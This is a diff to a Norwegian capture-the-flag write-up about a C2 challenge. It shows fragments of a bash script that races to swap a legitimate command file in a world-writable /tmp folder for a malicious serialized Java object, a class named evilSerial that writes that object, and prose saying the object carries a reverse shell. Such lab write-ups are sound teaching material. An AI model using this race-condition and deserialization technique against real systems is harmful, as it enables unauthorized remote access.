@@ -58,7 +58,7 @@ do
 			sleep .001    # Sleep slik at koden får tid til å gjennomføre signatur-sjekk på den legitime kommando-filen
 			base=$(basename -- "$f")    # Lagre tmp-navnet i variabel `base`
 			mv -v $base ../   # Flytt den legitime kommando-filen bort
-			cp ../evil_config_deadbeef $base   # Kopier ond kommando-fil til det samme tmp-navnet som den legitime filen hadde
+			cp ../evil_config $base   # Kopier ond kommando-fil til det samme tmp-navnet som den legitime filen hadde
 			break   # Nå vil databasen ane fred og ingen fare og lagre den onde kommando-filen
 		done
 	fi
@@ -94,7 +94,7 @@ public class evilSerial {
 
     public static void main(String[] args) throws IOException {
 
-        FileOutputStream fos = new FileOutputStream("evil_config_deadbeef");
+        FileOutputStream fos = new FileOutputStream("evil_config");
         ObjectOutputStream os = new ObjectOutputStream(fos);
         writeObject(os);
         os.close();
@@ -108,3 +108,16 @@ public class evilSerial {
 Video av gjennomføring:
 
 ![](https://github.com/vegkva/writeups/blob/main/etjenesten_h%C3%B8st22/C2/ezgif-5-710a3f6a0c.gif)
+
+Vindu til høyre:
+- Først sendes det en legitim kommando til en av de infiserte klientene (DEADBEEFDEADBEEF) via C2-serveren (shady-aggregator)
+- I server-koden gjøres det en signatursjekk av kommando-objektet
+- Dersom signaturen feiler, vil ikke kommandoen sendes videre til klienten
+- Når signaturen er sjekket og validert lagres kommandoen i en database som sender til klienter hver gang de sjekker inn.
+- Men før kommandoen lagres i databasen blir den lagret som en tmp-fil i "/tmp/.../" (denne løsningen sammen med linux-rettigheter er hva som blir utnyttet)
+
+Vindu til venstre:
+- Her kjøres det et skript som hele tiden sjekker om kommandoen (eks. tmp15gj3H2) er lagret i "/tmp/.../"
+- Når kommandoen er lagret, fjernes den og blir erstattet med mitt eget java-objekt med "reverse shell"
+
+Mappen "/tmp/.../" har 777 rettigheter. Det har altså ingen betydning at tmp-filen eies av c2 med 700 rettigheter.
